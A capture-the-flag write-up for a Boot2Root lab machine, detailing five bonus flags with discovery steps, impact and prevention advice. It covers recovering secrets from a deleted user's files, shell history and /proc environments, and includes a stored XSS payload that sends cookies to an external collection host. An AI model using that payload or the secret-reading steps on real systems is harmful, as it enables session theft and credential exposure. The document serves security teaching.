# Bonus flags

[← Repository index](../README.md) · [Debug endpoint walkthrough](../writeup1.md) · [SSTI walkthrough](../writeup2.md)

> **42 Boot2Root · HAL9042**
>
> Five additional flags, with discovery steps, impact, and prevention.

## Contents

- [Bonus 1 — Deleted User File Disclosure](#bonus-1--deleted-user-file-disclosure)
- [Bonus 2 — Bash History Information Disclosure](#bonus-2--bash-history-information-disclosure)
- [Bonus 3 — UDP Service with Predictable Handshake](#bonus-3--udp-service-with-predictable-handshake)
- [Bonus 4 — Process Environment Variable Disclosure](#bonus-4--process-environment-variable-disclosure)
- [Bonus 5 — Stored Cross-Site Scripting (XSS)](#bonus-5--stored-cross-site-scripting-xss)

This report documents the five bonus flags discovered during the Boot2Root project. Each flag was obtained through a different vulnerability, independently of the main privilege-escalation chain.

## Bonus 1 — Deleted User File Disclosure

### Discovery

While investigating the filesystem, I searched for files belonging to UID 1337, associated with the deleted user xavier.

```bash
find / -uid 1337 2>/dev/null
```

The command revealed several leftover files:

```text
/home/xavier
/var/backups/xbackup
/var/backups/.xavier_uid1337.bak
/tmp/.xn
/tmp/.xn/last_message.txt
/tmp/.xn/contact_ol_nov25.txt
/tmp/.xn/.key_part
```

I noticed an executable named `xbackup` inside `/var/backups` and decided to inspect its contents.

```bash
strings /var/backups/xbackup
```

Among the extracted strings, I discovered:

```text
FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
```

### Vulnerability and Impact

Deleting a Linux user does not automatically delete their files. Xavier's old backup executable was still present and contained sensitive information embedded directly in the binary.

This allowed me to recover the flag without executing the program or needing root privileges.

### Prevention

Remove unnecessary files belonging to deleted accounts, restrict access to backup directories, and avoid hardcoding sensitive information inside executables.

### Result

```text
FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
```

---

## Bonus 2 — Bash History Information Disclosure

### Discovery

While investigating Sophie's account, I inspected her Bash history.

```bash
cat ~/.bash_history
```

I discovered a command referencing an internal telemetry endpoint:

```bash
# quick check the internal telemetry endpoint is still up (F14 hint)
curl -s "http://127.0.0.1:9000/internal/telemetry"
```

I executed the same command:

```bash
curl -s "http://127.0.0.1:9000/internal/telemetry"
```

The server returned:

```text
FLAG{b4sh_h1st0ry_1s_4_d14ry}
```

### Vulnerability and Impact

Sophie's command history exposed the location of an internal service.

The telemetry endpoint also lacked authentication and returned sensitive information to anyone able to access it locally.

This demonstrated how command history can reveal useful internal information and lead to unintended data disclosure.

### Prevention

Avoid storing sensitive information in shell history, restrict access to internal services, and require authentication before returning sensitive data.

### Result

```text
FLAG{b4sh_h1st0ry_1s_4_d14ry}
```

---

## Bonus 3 — UDP Service with Predictable Handshake

### Discovery

During service enumeration, I checked the listening ports:

```bash
ss -tulnp
```

I discovered a Python service listening on UDP port 1337.

After investigating the service, I found its source code:

```bash
cat /opt/hal9042/services/whisper.py
```

The script contained:

```python
PORT = int(os.environ.get("UDP_PORT", "1337"))
MAGIC = os.environ.get("MAGIC", "KNOCK")
HOST = socket.gethostname()
HANDSHAKE = f"{MAGIC} {HOST}"
```

It also revealed that the service returned a flag when the received message matched the expected handshake.

I constructed the handshake using the default magic word and the machine's hostname.

```bash
printf 'KNOCK %s' "$(hostname)" | nc -u -w 2 127.0.0.1 1337
```

Response:

```text
FLAG{udp_1s_4_wh1sp3r}
```

### Vulnerability and Impact

The service used a predictable handshake instead of proper authentication.

Anyone able to access the UDP port and determine the hostname could reproduce the expected message and retrieve the flag.

### Prevention

Use proper authentication, avoid predictable authentication values, and restrict access to internal UDP services.

### Result

```text
FLAG{udp_1s_4_wh1sp3r}
```

---

## Bonus 4 — Process Environment Variable Disclosure

### Discovery

During the investigation, I had already discovered the HAL9042 evaluation daemon located in `/opt/hal9042`.

I decided to inspect the environment variables of its running process.

First, I identified its PID:

```bash
sudo ss -tulnp
```

The daemon was running as wil, with PID 625, listening on TCP port 7042.

I then inspected the permissions of its environment file:

```bash
ls -l /proc/625/environ
```

Output:

```text
-r-------- 1 wil wil 0 Nov 9 20:49 environ
```

The file was owned by wil and readable only by its owner (and privileged processes).

Since I had already gained access to the wil account earlier in the challenge, I could read the environment file using that account.

### Reading the Process Environment

Command:

```bash
cat /proc/625/environ
```

Among the environment variables, I discovered:

```text
USER=wil
HAL_ENV=development
HAL_DEBUG_KEY=leftover-dev-key-rotate-before-prod
HAL_DEV_FLAG=FLAG{pr0c_kn0ws_4ll_s3cr3ts}
```

### Vulnerability and Impact

Vulnerability: Sensitive information stored in process environment variables.

The daemon stored a development debugging key and a flag inside its environment. Because the process ran as wil, another process with sufficient permissions under the same account could access this information through `/proc`.

Impact: Compromising the wil account could expose sensitive environment variables belonging to services running under that identity.

### Prevention

- Avoid storing unnecessary secrets in process environment variables.
- Use protected secret-management mechanisms.
- Remove development credentials before deployment.
- Isolate sensitive services using dedicated system accounts.

### Result

Successfully recovered the fourth bonus flag:

```text
FLAG{pr0c_kn0ws_4ll_s3cr3ts}
```

Technique: Process enumeration and reading environment variables through `/proc`.

---

## Bonus 5 — Stored Cross-Site Scripting (XSS)

### Discovery

While inspecting the Flask application, I discovered an appeals feature.

The `/appeal` endpoint accepted user input and stored it in a database. The submitted information was later displayed through `/appeal/<id>`.

I also discovered a Python script responsible for automatically reviewing appeals using Playwright.

The reviewer bot visited submitted appeals and had two cookies:

```python
COOKIES = [
    {"name": "hal_session", "value": SESSION, "url": APP_URL, "httpOnly": False},
    {"name": "flag", "value": FLAG, "url": APP_URL, "httpOnly": False},
]
```

Since the flag cookie was configured with `httpOnly: False`, JavaScript running in the reviewer's browser could access it.

### Exploitation

I submitted an appeal containing a stored XSS payload:

```html
<img src=x onerror="new Image().src='https://sender-immune-forming-patrol.trycloudflare.com/c?test=' + document.cookie">
```

The invalid image source triggered the `onerror` event.

The JavaScript read the browser's cookies and sent them to my collection server through an HTTP GET request.

When the automated reviewer visited the appeal, the injected JavaScript executed.

My collection server received:

```text
GET /c?test=hal_session=hal-reviewer-7e3f1a;%20flag=FLAG{h4l_r3v13ws_3v3ry_4pp34l} HTTP/1.1
```

This confirmed that the payload executed inside the reviewer's browser and that the flag cookie was accessible.

### Vulnerability and Impact

The application was vulnerable to Stored Cross-Site Scripting because user-controlled content could execute JavaScript when an appeal was viewed.

The reviewer bot automatically visited these appeals while carrying sensitive cookies that were accessible through JavaScript.

This allowed the flag cookie to be disclosed to an external endpoint.

### Prevention

Escape untrusted HTML content, avoid rendering user input as executable markup, set sensitive cookies with HttpOnly, use a restrictive Content Security Policy, and isolate automated reviewer sessions.

### Result

```text
FLAG{h4l_r3v13ws_3v3ry_4pp34l}
```
